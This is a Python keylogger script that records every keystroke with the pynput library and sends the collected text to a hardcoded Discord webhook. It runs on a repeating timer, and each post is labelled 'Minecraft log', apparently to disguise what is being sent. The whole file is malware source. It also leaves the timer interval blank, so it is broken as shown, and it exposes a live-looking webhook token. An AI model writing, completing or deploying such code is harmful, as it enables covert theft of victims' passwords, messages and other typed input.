from pynput import keyboard
import requests
import threading

text = ""
webhook_url = "https://discord.com/api/webhooks/1408774591219765328/O5sak8Ik3Vl0_HvoS2DYjWcbppTYt4S7nWYOe9iZAJxlbwbgcvo76Y5ovA4PN23N6nm5" # 
time_interval =

def send_data():
    data = {
        "content": text,
        "title": "Minecraft log"
    }
    requests.post("https://discord.com/api/webhooks/1408774591219765328/O5sak8Ik3Vl0_HvoS2DYjWcbppTYt4S7nWYOe9iZAJxlbwbgcvo76Y5ovA4PN23N6nm5", json=data)
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
        else:
            pass
    elif key == keyboard.Key.esc:
        return False
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_data()
    listener.join()